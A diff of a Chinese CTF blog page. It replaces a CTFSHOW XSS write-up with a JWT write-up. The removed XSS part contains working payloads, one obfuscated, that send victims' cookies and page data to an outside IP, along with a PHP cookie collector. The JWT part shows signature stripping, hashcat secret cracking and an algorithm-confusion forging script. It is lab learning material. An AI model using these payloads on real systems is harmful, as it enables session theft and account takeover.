@@ -4,12 +4,14 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="CTFSHOW-XSS, marin的小窝">
-    <meta name="description" content="XSSweb 316XSS 题，网页给了提示，反射型 XSS
-填入简单的 payload
-&amp;lt;script&amp;gt;alert(document.cookie)&amp;lt;&amp;#x2F;script&amp;gt;
+    <meta name="keywords" content="CTFSHOW-JWT, marin的小窝">
+    <meta name="description" content="JWTweb345查看源码发现提示 /admin 
+然后查看请求 JWT，可以发现就没有加密
 
-显示不是 admin，这里是看 w">
+这里可以看到换表是这个，但是我修改 user 为 admin，然后加密后不行，但是修改 alg 的参数反而可以得到
+
+
+但是在 burp 的编码">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -21,7 +23,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>CTFSHOW-XSS | marin的小窝</title>
+    <title>CTFSHOW-JWT | marin的小窝</title>
     <link rel="icon" type="image/jpeg" href="/favicon.jpg">
     
 
@@ -253,12 +255,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/C48D0E0116BE1A22224E9F6E7048BDCA.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">CTFSHOW-XSS</h1>
+                    <h1 class="description center-align post-title">CTFSHOW-JWT</h1>
                 </div>
             </div>
         </div>
@@ -311,7 +313,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2025-07-30
+                    2025-08-01
                 </div>
                 
 
@@ -335,216 +337,114 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><h3 id="web-316"><a href="#web-316" class="headerlink" title="web 316"></a>web 316</h3><p>XSS 题，网页给了提示，反射型 XSS</p>
-<p>填入简单的 payload</p>
-<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;script&gt;alert(document.cookie)&lt;&#x2F;script&gt;</code></pre>
-
-<p>显示不是 admin，这里是看 wp 的，和之前做 burplab 不同的地方，这里需要XSS 的不是自己的信息，这里有一个后台的 bot ，会访问你的 XSS 代码，所以需要获取他的信息</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250731151415-20260228215258-w3lvnw9.png" alt="image"></p>
-<p>这里利用 vps 创建一个 php 服务，让用户访问时带上一个参数</p>
-<pre class="line-numbers language-php" data-language="php" data-start="1"><code class="language-php">&lt;?php
-$content &#x3D; $_GET[&#39;cookie&#39;];
-if(isset($content))&#123;
-        file_put_contents(&#39;.&#x2F;flag.txt&#39;,$content);
-&#125;else&#123;
-        echo &#39;no thing&#39;;
-&#125;</code></pre>
-
-<p>然后创建服务</p>
-<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">php -S 0.0.0.0:8080</code></pre>
-
-<p>接着使用这个 payload 发送上去，bot 就会触发这个，将 cookie 给到 vps</p>
-<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;script&gt;location.href&#x3D;&quot;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;index.php?cookie&#x3D;&quot;+document.cookie&lt;&#x2F;script&gt;</code></pre>
-
-<blockquote>
-<p><code>location.href</code> ：将页面重定向到后面的 url</p>
-</blockquote>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250731174113-20260228215258-1wx8udd.png" alt="image"></p>
+                <h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><h3 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h3><p>查看源码发现提示 <code>/admin</code> </p>
+<p>然后查看请求 JWT，可以发现就没有加密</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251129194335-vgqdgpm.png" alt="image"></p>
+<p>这里可以看到换表是这个，但是我修改 user 为 admin，然后加密后不行，但是修改 <code>alg</code> 的参数反而可以得到</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251129194515-38nt9o9.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251129194545-ehmxshu.png" alt="image"></p>
+<p>但是在 burp 的编码工具中这样修改就可以，没懂为什么</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251129194629-saoonzk.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251129194706-xqkqhps.png" alt="image"></p>
 <p>‍</p>
-<h3 id="web-317"><a href="#web-317" class="headerlink" title="web 317"></a>web 317</h3><p>这里应该是过滤了 <code>script</code>，没有效果</p>
-<p>用 <code>onerror</code> 成功</p>
-<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;img src&#x3D;&quot;&quot; onerror&#x3D;alert(&quot;1&quot;)&gt;</code></pre>
+<h3 id="web346"><a href="#web346" class="headerlink" title="web346"></a>web346</h3><p>burp 抓包，可以看到有了加密</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251129194902-syjrql2.png" alt="image"></p>
+<p>用 hashcat 开爆</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">hashcat -a 0 -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc2NDQxNjg4OSwiZXhwIjoxNzY0NDI0MDg5LCJuYmYiOjE3NjQ0MTY4ODksInN1YiI6InVzZXIiLCJqdGkiOiI0YjVkZDMzZWJiZmU5YmQyMDE5Y2JlNGFhYjQ2NmM3OCJ9.cCKr9ivDl0ZB8RCqlF-eZtFXZJRspjH_V-ZhbjutOK8 rockyou.txt</code></pre>
 
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250731175210-20260228215258-m8x2vl1.png" alt="image"></p>
-<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;img src&#x3D;&quot;&quot; onerror&#x3D;location.href&#x3D;&quot;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;index.php?cookie&#x3D;&quot;+document.cookie&gt;</code></pre>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251129195331-m3s5c0n.png" alt="image"></p>
+<p>但是这题考的不是这个，这里考的是绕过签名，有些服务不会校验 JWT 的签名部分，于是可以修改 payload 和加密算法之后将签名部分删除，最后的点不能少</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251129201057-uvy57fl.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251129201134-6jhtt5s.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web347"><a href="#web347" class="headerlink" title="web347"></a>web347</h3><p>这题就是开爆了，最后密码也是 123456</p>
+<pre class="line-numbers language-bash" data-language="bash" data-start="1"><code class="language-bash">hashcat -a 0 -m 16500 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTc2NDQxODMyOSwiZXhwIjoxNzY0NDI1NTI5LCJuYmYiOjE3NjQ0MTgzMjksInN1YiI6InVzZXIiLCJqdGkiOiI2MzJjZjQ2MmFmZmRmODE1ZGI4MzRiN2VhODY2ODBkZiJ9.x5llUWVfKlKUU0Lwf6RmiBsDQWqPLqE7WCLQlXacWco wordlist&#x2F;rockyou.txt</code></pre>
 
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251129202406-67qys5n.png" alt="image"></p>
+<p>然后可以用 <code>jwt.io</code> 签名也可以用 burp ，这里记录一下 burp 的用法</p>
+<p>在 JWT 中选择 <code>New Symmetric Key</code> </p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251129203127-dazqxoj.png" alt="image"></p>
+<p>生成之后将 k 的值修改为密码的 base64 </p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251129203203-1tnjjwe.png" alt="image"></p>
+<p>然后修改 JWT 内容后签名</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251129203304-roclrte.png" alt="image"></p>
 <p>成功</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250731175405-20260228215258-8s1gut6.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251129203320-8jy7o05.png" alt="image"></p>
 <p>‍</p>
-<h3 id="web-318"><a href="#web-318" class="headerlink" title="web 318"></a>web 318</h3><p>不清楚是过滤了 <code>img</code>​ 还是 <code>onerror</code></p>
-<p>使用 <code>body</code>​ 配合 <code>onload</code> 就行</p>
-<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;body onload&#x3D;alert(&quot;1&quot;)&gt;</code></pre>
-
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250731200914-20260228215259-ntgdfml.png" alt="image"></p>
-<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;body onload&#x3D;location.href&#x3D;&quot;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;index.php?cookie&#x3D;&quot;+document.cookie&gt;</code></pre>
-
-<p>成功拿到<br>这里突然发现，好像都不用写 php ，直接在 url 里看就行（</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250731201032-20260228215259-nsjm0qj.png" alt="image"></p>
-<hr>
-<p>这里学到一个奇怪的绕过方法</p>
-<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;body οnlοad&#x3D;document.write(String.fromCharCode(60,115,99,114,105,112,116,62,100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,39,104,116,116,112,58,47,47,49,48,49,46,51,53,46,49,53,49,46,52,50,58,56,48,56,48,47,105,110,100,101,120,46,112,104,112,63,99,111,111,107,105,101,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,60,47,115,99,114,105,112,116,62));&gt;</code></pre>
-
-<blockquote>
-<p><code>document.write()</code>：将字符串写入 HTML 页面中</p>
-<p><code>String.fromCharCode</code>：将 ascii 转化为字符串</p>
-</blockquote>
-<p>所以这个就相当于</p>
-<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;body οnlοad&#x3D;document.write(String.fromCharCode(
-&lt;script&gt;document.location.href&#x3D;&#39;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;index.php?cookie&#x3D;&#39;+document.cookie&lt;&#x2F;script&gt;
-);&gt;</code></pre>
-
-<p>随便写个脚本就行</p>
-<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">code &#x3D; &quot;&lt;script&gt;document.location.href&#x3D;&#39;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;index.php?cookie&#x3D;&#39;+document.cookie&lt;&#x2F;script&gt;&quot;
-
-for  i in code :
-    asc &#x3D; ord(i)
-    print(asc,end&#x3D;&#39;,&#39;)</code></pre>
-
+<h3 id="web348"><a href="#web348" class="headerlink" title="web348"></a>web348</h3><p>一样开爆，只是密码不一样，后面都一样了</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251129203523-4psymgi.png" alt="image"></p>
 <p>‍</p>
-<p>‍</p>
-<h3 id="web-319"><a href="#web-319" class="headerlink" title="web 319"></a>web 319</h3><p>不清楚过滤了什么，但是 body 照样能用</p>
-<p>‍</p>
-<h3 id="web-320"><a href="#web-320" class="headerlink" title="web 320"></a>web 320</h3><p><del>body 被过滤了，但是是配合</del>  <del>​<code>&lt;&gt;</code>​</del> ​ <del>就被 waf</del></p>
-<p>搞错了，是过滤了空格，使用注释 <code>/**/</code> 来绕过，一些经常用的空格绕过方法好像都行</p>
-<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;body&#x2F;**&#x2F;onload&#x3D;alert(&quot;1&quot;)&gt;</code></pre>
+<h3 id="web349"><a href="#web349" class="headerlink" title="web349"></a>web349</h3><p>题目给了一个 js</p>
+<pre class="line-numbers language-javascript" data-language="javascript" data-start="1"><code class="language-javascript">&#x2F;* GET home page. *&#x2F;
+router.get(&#39;&#x2F;&#39;, function(req, res, next) &#123;
+  res.type(&#39;html&#39;);
+  var privateKey &#x3D; fs.readFileSync(process.cwd()+&#39;&#x2F;&#x2F;public&#x2F;&#x2F;private.key&#39;);
+  var token &#x3D; jwt.sign(&#123; user: &#39;user&#39; &#125;, privateKey, &#123; algorithm: &#39;RS256&#39; &#125;);
+  res.cookie(&#39;auth&#39;,token);
+  res.end(&#39;where is flag?&#39;);
+  
+&#125;);
 
-<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;body&#x2F;**&#x2F;onload&#x3D;location.href&#x3D;&quot;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;index.php?cookie&#x3D;&quot;+document.cookie&gt;</code></pre>
-
-<p>‍</p>
-<h3 id="web-321-326"><a href="#web-321-326" class="headerlink" title="web 321-326"></a>web 321-326</h3><p>同上一题，难绷，搞这么多反射型的，但是一个 paylaod 过完了</p>
-<p>‍</p>
-<h3 id="web-327"><a href="#web-327" class="headerlink" title="web 327"></a>web 327</h3><p>到存储型 XSS 了，这里测试了一会发现一直网络拥堵，还以为不是这个漏洞点，后面看了下 wp 发现是收件人要是 admin ，有点妹想到</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250801102206-20260228215259-dtkpe2n.png" alt="image"></p>
-<p>最后用之前的 payload 就行，这题没有过滤什么东西</p>
-<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&lt;script&gt;location.href&#x3D;&quot;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;index.php?cookie&#x3D;&quot;+document.cookie&lt;&#x2F;script&gt;</code></pre>
-
-<p>‍</p>
-<h3 id="web-328"><a href="#web-328" class="headerlink" title="web 328"></a>web 328</h3><p>有一个注册页面，发现在用户管理页面管理员是可以看到用户名的，所以应该是在用户名的地方进行 XSS</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250801103029-20260228215259-y9a696e.png" alt="image"></p>
-<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&lt;script&gt;location.href&#x3D;&quot;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;index.php?cookie&#x3D;&quot;+document.cookie&lt;&#x2F;script&gt;</code></pre>
-
-<p>从管理员那里先拿到 cookie</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250801103132-20260228215259-yveab68.png" alt="image"></p>
-<p>然后访问，但是因为有这个东西，一直访问的时候就跳转了（</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250801103301-20260228215259-2ebm3fe.png" alt="image"></p>
-<p>只能用 burp 拦截了</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250801104255-20260228215259-ph8tkuz.png" alt="image"></p>
-<p>‍</p>
-<h3 id="web-329"><a href="#web-329" class="headerlink" title="web 329"></a>web 329</h3><p>这里同样拿到 cookie ，但是好像会马上失效</p>
-<p>这里学到了用 XSS 获取页面的元素</p>
-<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&lt;script&gt;
-window.open(&#39;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;&#39;+document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)[2].innerHTML)
-&lt;&#x2F;script&gt;</code></pre>
-
-<blockquote>
-<p><code>window.open</code>​：这个和 <code>location.href</code> 有区别，这个就不会出现上面的问题，会在新窗口打开页面</p>
-<p><code>document.getElementsByClassName</code>：获取 HTML 页面中带有指定类名的元素</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250801122839-20260228215259-tdy8raq.png" alt="image"></p>
-<p><code>innerHTML</code>​ 和 <code>outerHTML</code>​<br>​<code>innerHTML</code>​ ：获取元素内部所有的 HTML<br>​<code>outerHTML</code> ：获取元素自身和内部所有 HTML</p>
-</blockquote>
-<p>成功获取到 flag</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250801123158-20260228215300-hjvw22f.png" alt="image"></p>
-<hr>
-<p>跟着 wp 学到的第二个方法，使用 <code>jQuery</code> 选择器</p>
-<pre class="line-numbers language-javascript" data-language="javascript" data-start="1"><code class="language-javascript">$(&#39;.laytable-cell-1-0-1&#39;).each(function(index,value)&#123;
-	console.log(value);
+router.post(&#39;&#x2F;&#39;,function(req,res,next)&#123;
+	var flag&#x3D;&quot;flag_here&quot;;
+	res.type(&#39;html&#39;);
+	var auth &#x3D; req.cookies.auth;
+	var cert &#x3D; fs.readFileSync(process.cwd()+&#39;&#x2F;&#x2F;public&#x2F;public.key&#39;);  &#x2F;&#x2F; get public key
+	jwt.verify(auth, cert, function(err, decoded) &#123;
+	  if(decoded.user&#x3D;&#x3D;&#x3D;&#39;admin&#39;)&#123;
+	  	res.end(flag);
+	  &#125;else&#123;
+	  	res.end(&#39;you are not admin&#39;);
+	  &#125;
+	&#125;);
 &#125;);</code></pre>
 
-<blockquote>
-<p>逐个遍历 class 为 <code>.laytable-cell-1-0-1</code>​ ，因为前面看到的是 <code>layui-table-cell laytable-cell-1-0-1</code>，是有两个类的意思，这里主要获取密码这个类就行，所以用后面的那个</p>
-<p><code>each</code>​ ：对当前 <code>jQuery</code>​ 选中的每一个元素执行一次指定的回调函数，就是后面的 <code>function</code>​ ，这里接收两个参数，<code>index、value</code></p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250801152023-20260228215300-hh8l0rk.png" alt="image"></p>
-</blockquote>
-<p>利用这个构造 payload</p>
-<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;script&gt;
-$(&#39;.laytable-cell-1-0-1&#39;).each(function(index,value)&#123;
-	if(value.innerHTML.indexOf(&#39;ctfshow&#123;&#39;)&gt;-1)&#123;
-window.open(&#39;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;&#39;+value.innerHTML);
-&#125;&#125;);
-&lt;&#x2F;script&gt;</code></pre>
-
-<blockquote>
-<p><code>indexOf()</code>：这个是遍历中的条件语句，检查当前的元素中是否包含字符串，绕过包含则返回大于 -1 的索引，否则返回 -1</p>
-</blockquote>
-<hr>
-<p><code>querySelector</code> 获取元素</p>
-<p><code>querySelector</code> 是 js 中用于从文档中获取元素的方法，通过指定 CSS 选择器来查找</p>
-<pre class="line-numbers language-javascript" data-language="javascript" data-start="1"><code class="language-javascript">var element &#x3D; document.querySelector(CSSselector);</code></pre>
-
+<p>看到这个源码，直接访问 <code>/public.key</code>​ 和 <code>/private.key</code> 得到公私钥，源码看到用公钥解密，私钥加密，这里就用私钥</p>
+<p>选择 <code>New RSA Key</code></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251129204132-arjp9sr.png" alt="image"></p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251129204742-1kqbk71.png" alt="image"></p>
+<p>然后修改</p>
+<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/image-20251129204849-uy2p1e0.png" alt="image"></p>
+<p>‍</p>
+<h3 id="web350"><a href="#web350" class="headerlink" title="web350"></a>web350</h3><p>给了源码，可以发现加密和上一题是一样的，不过不能访问这个私钥了，但是可以拿到公钥</p>
+<p>这里学到的是使用篡改加密算法，这里的原理是</p>
 <ul>
-<li><code>CSSselector</code> 就是要查找的元素选择器</li>
+<li><p>服务器在验证 JWT 的时候，是使用 <code>alg</code> 字段来选择加密的方式，服务器没有限制这个的话，攻击者就能修改这个加密算法，利用公钥来签名</p>
+</li>
+<li><p><code>HS256</code> 是对称加密的，加解密都使用同一个密钥</p>
+<p><code>RS256</code> 是非对称加密的，用公钥或私钥加密，然后用另一个解密</p>
+<p>这里就可以用 RSA 的公钥来使用 HMAC 生成签名，服务端在解密的时候也是用公钥来作为 HMAC 密钥生成签名，这样签名就合法了，成功篡改了加密的方式</p>
+</li>
 </ul>
-<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;script&gt;
-var img &#x3D; new Image();
-img.src &#x3D; &quot;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;&quot;+document.querySelector(&#39;#top &gt; div.layui-container &gt; div:nth-child(4) &gt; div &gt; div.layui-table-box &gt; div.layui-table-body.layui-table-main&#39;).textContent;
-document.body.append(img);
-&lt;&#x2F;script&gt;</code></pre>
+<p>这里自己试了用 burp 发现不太行，最后还是使用星海河师傅的脚本 orz</p>
+<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">import jwt  
+  
+# 原始 JWT 粘贴到这里  
+orig &#x3D; &quot;eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXNlciIsImlhdCI6MTc1NzQ4NDU1NH0.QKpMeBqmdq3D1i-3AXwpwxo1vJd7ZAoKUBD76pmOu8D9jhbXF8enHCECZ53218LPNyjbBG-h6xVycQ7kHi0vLzBJHM0P4zuqCJMd0CkDksNVf0vlznp4LcmxqWHhok38ohY5tNgR1uE5ULDa9rOVt2_T0juJPWDD-h_360-S0NA&quot;  
+  
+# 解析 JWT，获取头部和载荷  
+header &#x3D; jwt.get_unverified_header(orig)  
+payload &#x3D; jwt.decode(orig, options&#x3D;&#123;&quot;verify_signature&quot;: False&#125;)  
+print(&quot;Header:\n&quot;,header,&quot;\n&quot;,&quot;Payload:\n&quot;,payload,&quot;\n&quot;)  
+  
+# 修改头部和载荷  
+header[&quot;alg&quot;] &#x3D; &quot;HS256&quot;  
+payload[&quot;user&quot;] &#x3D; &quot;admin&quot;  
+  
+# 重新签名并输出新的 JWT
+# 读取公钥全文
+with open(&quot;public.key&quot;, &quot;rb&quot;) as f:  
+    key &#x3D; f.read()  
+  
+token &#x3D; jwt.encode(payload, key, algorithm&#x3D;&quot;HS256&quot;, headers&#x3D;header)  
+print(token)</code></pre>
 
-<blockquote>
-<p><code>document.body.append(img)</code>：将创建的图像元素 img 添加到页面的 body 中</p>
-</blockquote>
+<p>这里直接利用他给的源码该也可以</p>
 <p>‍</p>
-<h3 id="web-330"><a href="#web-330" class="headerlink" title="web 330"></a>web 330</h3><p>这里多了一个修改密码的页面</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250801150031-20260228215300-kixm6xx.png" alt="image"></p>
-<p>使用上一题的 payload 发现传过来的是 <code>*</code>，使用 cookie 也不行</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250801150211-20260228215300-wntdgqo.png" alt="image"></p>
-<p>使用 <code>outerHTML</code> 测试发现就是没有显示</p>
-<pre class="line-numbers language-python" data-language="python" data-start="1"><code class="language-python">&lt;script&gt;
-window.open(&#39;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;?cookie&#x3D;&#39;+document.getElementsByClassName(&#39;layui-table-cell laytable-cell-1-0-1&#39;)[6].outerHTML)
-&lt;&#x2F;script&gt;</code></pre>
-
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250801150301-20260228215300-poj2iq4.png" alt="image"></p>
-<p>都走不通感觉就是要修改 admin 的密码去登录，修改密码，抓包</p>
-<p>发现用的是这个路由修改的，那就让 bot 自己修改密码</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250801153234-20260228215300-o5r62io.png" alt="image"></p>
-<p>然后使用这个 payload 就可以修改 admin 的密码</p>
-<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;script&gt;
-window.location.href&#x3D;&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;api&#x2F;change.php?p&#x3D;123&#39;;
-&lt;&#x2F;script&gt;</code></pre>
-
-<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;script&gt;
-window.open(&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;api&#x2F;change.php?p&#x3D;123&#39;);
-&lt;&#x2F;script&gt;</code></pre>
-
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250801153704-20260228215300-cw47uji.png" alt="image"></p>
-<h3 id="web-331"><a href="#web-331" class="headerlink" title="web 331"></a>web 331</h3><p>抓包看到这里的请求变成了 post 请求</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250801165258-20260228215300-zpsar62.png" alt="image"></p>
-<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;script&gt;
-$.ajax(&#123;url:&quot;&#x2F;api&#x2F;change.php&quot;,method:&quot;POST&quot;,data:&#123;&#39;p&#39;:&#39;123&#39;&#125;&#125;);
-&lt;&#x2F;script&gt;</code></pre>
-
-<blockquote>
-<p><code>$.ajax()</code>​：这个是 <code>jQuery</code> 中的一个方法，用于发起异步 HTTP 请求</p>
-</blockquote>
-<p>成功获取</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250801170529-20260228215300-oxm9h76.png" alt="image"></p>
 <p>‍</p>
-<h3 id="web-332"><a href="#web-332" class="headerlink" title="web 332"></a>web 332</h3><p>多了一个转账汇款的功能，猜测就是让 admin 用户给你转账</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250801170842-20260228215301-gea3gpa.png" alt="image"></p>
-<p>测试的时候发现了几个问题，一个就是登录的时候去购买 flag 依旧显示先登录，并且在转账的时候显示有内鬼</p>
-<p>这里是转账的请求</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250801171854-20260228215301-tt9bwtp.png" alt="image"></p>
-<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;script&gt;
-$.ajax(&#123;url:&quot;&#x2F;api&#x2F;amount.php&quot;,method:&quot;POST&quot;,data:&#123;&#39;u&#39;:&#39;1&#39;,&#39;a&#39;:&#39;9999&#39;&#125;,success:function(response)&#123;window.open(&#39;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;&#39;+response)&#125;,error:function()&#123;window.open(&#39;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;error&#39;)&#125;&#125;);
-&lt;&#x2F;script&gt;</code></pre>
-
-<p>难绷，拿到了这个还是让我先登录，服了（</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250801172105-20260228215301-8cuflu7.png" alt="image"></p>
-<p>那试试让 admin 去拿</p>
-<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;script&gt;
-$.ajax(&#123;url:&quot;&#x2F;api&#x2F;getFlag.php &quot;,method:&quot;POST&quot;,success:function(response)&#123;window.open(&#39;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;&#39;+response)&#125;,error:function()&#123;window.open(&#39;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;error&#39;)&#125;&#125;);
-&lt;&#x2F;script&gt;</code></pre>
-
-<p>得，返回来一个 admin 不需要 flag</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250801172326-20260228215301-24lbo71.png" alt="image"></p>
-<p>我晕了，是账户的问题，换一个账户名就行，不能用1什么的</p>
-<p><img src="https://marin-1347161933.cos.ap-guangzhou.myqcloud.com/img/network-asset-20250801173951-20260228215301-e00ovdd.png" alt="image"></p>
-<p>然后这里有一个非预期，给 admin 账户转 <code>-100000</code>​ ，就会变成正的，逻辑好像是 <code>5-(-100000)</code> 然后变成正的</p>
+<p>参考</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xinghaihe/p/19083689">JWT攻击详解与CTF实战 - 星海河 - 博客园</a></p>
 <p>‍</p>
-<h3 id="web-333"><a href="#web-333" class="headerlink" title="web 333"></a>web 333</h3><p>这个好像就是修复了上一题的非预期，但是我的 payload 没有问题</p>
-<pre class="line-numbers language-markup" data-language="markup" data-start="1"><code class="language-markup">&lt;script&gt;
-$.ajax(&#123;url:&quot;&#x2F;api&#x2F;amount.php&quot;,method:&quot;POST&quot;,data:&#123;&#39;u&#39;:&#39;23&#39;,&#39;a&#39;:&#39;9999&#39;&#125;,success:function(response)&#123;window.open(&#39;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;&#39;+response)&#125;,error:function()&#123;window.open(&#39;http:&#x2F;&#x2F;101.35.151.42:8080&#x2F;error&#39;)&#125;&#125;);
-&lt;&#x2F;script&gt;</code></pre>
 
                 
             </div>
